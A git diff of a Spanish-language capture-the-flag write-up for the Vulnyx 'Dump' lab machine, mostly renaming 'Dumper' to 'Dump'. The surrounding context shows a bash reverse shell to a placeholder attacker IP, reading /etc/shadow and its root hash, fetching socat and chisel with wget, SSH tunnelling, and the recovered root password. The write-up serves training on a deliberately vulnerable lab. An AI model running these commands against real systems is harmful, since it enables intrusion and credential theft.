@@ -1,5 +1,5 @@
 ---
-title: Vulnyx - Dumper
+title: Vulnyx - Dump
 author: estx
 date: 2024-04-27 16:41:00 +0800
 categories: [Writeup, Vulnyx, Easy]
@@ -7,7 +7,7 @@ tags: [Linux, 'Information Leakage', 'Local Port Forwarding']
 math: true
 mermaid: true
 image:
-  path: /assets/images/Vulnyx/Easy/Hook/logo.png
+  path: /assets/images/Vulnyx/Easy/Dumper/logo.png
   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
   alt: Hook Machine Logo
 ---
@@ -157,7 +157,7 @@ per@dump:~$ bash -c 'bash -i >& /dev/tcp/[IP Máquina Atacante]/4444 0>&1'
 b. Con [linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240421-825f642d) buscamos formas de escalar privilegios, lo que veremos es que podemos leer el contenido del `/etc/shadow`, aquí veremos el hash del usuario root el cual crackeamos con hashcat
 
 ```bash
-# Dumper
+# Dump
 dumper@dump:~$ cat /etc/shadow
 root:$6$jzcdBmCLz0zF2.b/$6sok07AjDc3TN3oeI/NqrdZ6NSQly3ADW6lvs3z5q.5GDqsCypL8WtL7ARhzDcdYgukakXWeNbiIP7GyigCse/:19762:0:99999:7:::
 ...
@@ -171,7 +171,7 @@ c. No podemos usar 'su' para transformarnos en **root**. Investigando más verem
 
 * Usando [**socat**](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
 
-  a. Descargamos socat en la Máquina Dumper
+  a. Descargamos socat en la Máquina Dump
 
   ```bash
   # Máquina Atacante
@@ -180,7 +180,7 @@ c. No podemos usar 'su' para transformarnos en **root**. Investigando más verem
   ❯ python -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
 
-  # Máquina Dumper
+  # Máquina Dump
   dumper@dump:/tmp$ wget -o- http://[IP Máquina Atancante]/socat
   ```
 
@@ -205,7 +205,7 @@ c. No podemos usar 'su' para transformarnos en **root**. Investigando más verem
 
 * Usando [**chisel**](https://github.com/jpillora/chisel/releases)
 
-  a. Descargamos chisel en la Máquina Dumper
+  a. Descargamos chisel en la Máquina Dump
 
   ```bash
   # Máquina Atacante
@@ -228,14 +228,14 @@ c. No podemos usar 'su' para transformarnos en **root**. Investigando más verem
   2024/04/27 23:24:56 server: Listening on http://0.0.0.0:4443
   ```
 
-  b. Ahora, le damos permisos de ejecución a chisel y hacemos el **Port Forwarding** en Dumper
+  b. Ahora, le damos permisos de ejecución a chisel y hacemos el **Port Forwarding** en Dump
 
   ```bash
   dumper@dump:/tmp$ ./chisel client [IP Máquina Atacante]:4443 R:[Puerto en nuestra máquina atacante]:127.0.0.1:22
   2024/04/27 23:27:20 client: Connecting to ws://192.168.100.55:4443
   ```
 
-  > **`[IP Máquina Atacante]:4443`** Aquí nos conectamos al servidor levantado en nuestra máquina atacante. **`R:[Puerto en nuestra máquina atacante]:127.0.0.1:22`** con esto indicamos un puerto de nuestra máquina atacante el cual ocupará el servicio SSH de la máquina Dumper
+  > **`[IP Máquina Atacante]:4443`** Aquí nos conectamos al servidor levantado en nuestra máquina atacante. **`R:[Puerto en nuestra máquina atacante]:127.0.0.1:22`** con esto indicamos un puerto de nuestra máquina atacante el cual ocupará el servicio SSH de la máquina Dump
   {: .prompt-info }
 
   c. Ahora, nos podemos autenticar en el servicio SSH con las credenciales `root:shadow123`
